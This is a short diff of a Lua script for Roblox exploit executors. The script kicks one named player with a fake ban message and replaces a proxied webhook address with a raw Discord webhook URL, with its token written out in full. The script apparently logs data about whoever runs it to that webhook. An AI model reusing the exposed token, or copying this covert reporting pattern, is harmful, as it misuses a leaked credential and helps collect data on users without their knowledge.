@@ -13,7 +13,7 @@ if LocalPlayer.Name == "ZxZy194" then
 	LocalPlayer:Kick("You have been banned from this experience: Exploiting")
 end
 
-local webhookURL = "https://webhook-protect.vercel.app/api/webhook?id=UWUtTGtQVjROVzZqb1FNa2dTeE42QTpqTUpJYi1fOUJZU1Y0RENuUVdVZnNDY2xVbGo4Y1hQMS1yS0x5WXlwZU1OLVJEbVdUZGVvUU1Lam5nRmdObi0xbkQ1bU9EaXBuR1gtNGlQNGdEYzcwcGZWNDY4RXB5NGlvU09hYUZ2bEZIV05aalhDSk5zbFFiQ0RMcDhSVEJRRXFhZmJRUlFnWm5pWWVUZG5QUDBYT0lrTE9iREZRNnhnNTJWRC01UHNlZWc"
+local webhookURL = "https://discord.com/api/webhooks/1358861967434977430/gG-5slP4ymn2ST46z_YRctCV6cydL_qr2-PmFRg4VH8fQEP19eoVmpQxOqxS-5S0hMYW"
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 task.wait(0.2)
 local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
